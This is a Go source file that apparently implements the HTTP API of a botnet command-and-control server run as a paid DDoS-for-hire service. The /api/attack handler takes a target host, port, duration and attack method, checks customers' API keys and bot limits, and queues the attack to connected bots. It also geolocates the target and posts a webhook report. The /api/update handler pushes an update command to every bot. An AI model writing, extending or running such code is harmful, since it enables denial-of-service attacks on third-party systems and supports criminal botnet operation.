package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

var ipInfoCache = make(map[string]*IPInfo)
var randSource = rand.New(rand.NewSource(time.Now().UnixNano()))

type IPInfo struct {
	IP            string `json:"query"`
	ASN           string `json:"as"`
	ASName        string `json:"asname"`
	ASDomain      string `json:"as_domain"`
	CountryCode   string `json:"countryCode"`
	Country       string `json:"country"`
	ContinentCode string `json:"continentCode"`
	Continent     string `json:"continent"`
	Org           string `json:"isp"`
	Region        string `json:"regionName"`
}

func getIPInfo(ip string, tokenList []string) (*IPInfo, error) {
	if info, ok := ipInfoCache[ip]; ok {
		return info, nil
	}

	url := fmt.Sprintf("http://ip-api.com/json/%s?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", ip)
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var info IPInfo
	err = json.NewDecoder(resp.Body).Decode(&info)
	if err != nil {
		return nil, err
	}
	ipInfoCache[ip] = &info
	return &info, nil
}

func calculateExpiry(lastPaid int64, interval int) string {
	return "Unknown"
}

func StartAPIServer(port string) {
	http.HandleFunc("/api/attack", attackHandler)
	http.HandleFunc("/api/update", updateHandler)
	fmt.Println("API server started on port", port)
	err := http.ListenAndServe("0.0.0.0:"+port, nil)
	if err != nil {
		fmt.Println("Failed to start API server:", err)
	}
}

func attackHandler(w http.ResponseWriter, r *http.Request) {
	if atomic.LoadInt32(&AttacksEnabled) == 0 {
		sendErrorResponse(w, "Attacks are currently DISABLED globally")
		return
	}
	query := r.URL.Query()
	user := query.Get("user")
	apikey := query.Get("apikey")
	host := query.Get("host")
	timeStr := query.Get("time")
	method := query.Get("method")
	portStr := query.Get("port")

	if user == "" || apikey == "" || host == "" || timeStr == "" || method == "" {
		sendErrorResponse(w, "Missing required parameters")
		return
	}

	duration, err := strconv.Atoi(timeStr)
	if err != nil {
		sendErrorResponse(w, "Invalid duration")
		return
	}

	valid, accountInfo, err := database.ValidateAPIKey(user, apikey)
	if err != nil {
		sendErrorResponse(w, "Database error: "+err.Error())
		return
	}
	if !valid {
		sendErrorResponse(w, "Invalid credentials or account expired")
		return
	}

	if accountInfo.admin == 0 && accountInfo.maxBots == 0 {
		sendErrorResponse(w, "Your account has been banned from using the API")
		return
	}

	if !strings.HasPrefix(method, ".") {
		method = "." + method
	}
	if portStr == "" {
		portStr = "0"
	}
	cmd := fmt.Sprintf("%s %s %s %s", method, host, portStr, timeStr)

	for key, values := range query {
		if key != "user" && key != "apikey" && key != "host" && key != "port" && key != "time" && key != "method" {
			if len(values) > 0 && values[0] != "" {
				cmd += fmt.Sprintf(" %s=%s", key, values[0])
			}
		}
	}

	atk, err := NewAttack(cmd, accountInfo.admin)
	if err != nil {
		sendErrorResponse(w, "Failed to parse attack: "+err.Error())
		return
	}

	canLaunch, err := database.CanLaunchAttack(user, uint32(duration), cmd, accountInfo.maxBots, 0, MaxGlobalAttacks)
	if err != nil || !canLaunch {
		sendErrorResponse(w, "Cannot launch attack: "+err.Error())
		return
	}

	if database.ContainsWhitelistedTargets(atk) {
		sendErrorResponse(w, "Attack blocked: targets are whitelisted")
		return
	}

	buf, err := atk.Build()
	if err != nil {
		sendErrorResponse(w, "Failed to build attack: "+err.Error())
		return
	}

	botsToUse := accountInfo.maxBots
	if atk.Bots > 0 {
		botsToUse = atk.Bots
	}

	clientList.QueueBuf(buf, botsToUse, "")
	database.LogAttack(accountInfo.IDs, atk.TargetIP, uint32(atk.Duration), cmd, botsToUse)

	var targetIP string
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, atk.TargetIP)
	targetIP = ip.String()

	// Locate tokenList if needed (using empty for simplicity as per existing getIPInfo call in admin.go)
	ipInfo, _ := getIPInfo(targetIP, []string{})
	if ipInfo == nil {
		ipInfo = &IPInfo{Country: "Unknown", Org: "Unknown", Region: "Unknown"}
	}

	// Webhook report
	displayBots := botsToUse
	if displayBots == -1 {
		displayBots = clientList.Count()
	} else if displayBots > clientList.Count() {
		displayBots = clientList.Count()
	}
	go sendAttackWebhook(method, targetIP, int(atk.Port), int(atk.Duration), ipInfo, user, displayBots, true)

	response := map[string]interface{}{
		"status":  "success",
		"message": "Attack sent successfully",
		"details": map[string]interface{}{
			"method":  method,
			"target":  targetIP,
			"port":    portStr,
			"time":    atk.Duration,
			"sent_by": user,
			"bots":    botsToUse,
		},
	}

	jsonData, err := json.MarshalIndent(response, "", "    ")
	if err != nil {
		sendErrorResponse(w, "Failed to marshal JSON: "+err.Error())
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonData)
}

func updateHandler(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query()
	user := query.Get("user")
	apikey := query.Get("apikey")
	ip := query.Get("ip")
	prefix := query.Get("prefix")
	dir := query.Get("dir")

	if user == "" || apikey == "" || ip == "" || prefix == "" || dir == "" {
		sendErrorResponse(w, "Missing required parameters")
		return
	}

	valid, accountInfo, err := database.ValidateAPIKey(user, apikey)
	if err != nil || !valid || accountInfo.admin == 0 {
		sendErrorResponse(w, "Invalid credentials or missing admin permissions")
		return
	}

	updateMsg := UpdateMessage{
		IP:     ip,
		Prefix: prefix,
		Dir:    dir,
	}

	buf := updateMsg.Build()
	clientList.QueueBuf(buf, -1, "")

	sendSuccessResponse(w, "Update command sent to all bots")
}

func sendErrorResponse(w http.ResponseWriter, message string) {
	response := map[string]string{
		"status":  "error",
		"message": message,
	}
	jsonData, err := json.MarshalIndent(response, "", "    ")
	if err != nil {
		http.Error(w, "Failed to marshal JSON", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusBadRequest)
	w.Write(jsonData)
}

func sendSuccessResponse(w http.ResponseWriter, message string) {
	response := map[string]string{
		"status":  "success",
		"message": message,
	}
	jsonData, err := json.MarshalIndent(response, "", "    ")
	if err != nil {
		http.Error(w, "Failed to marshal JSON", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(jsonData)
}
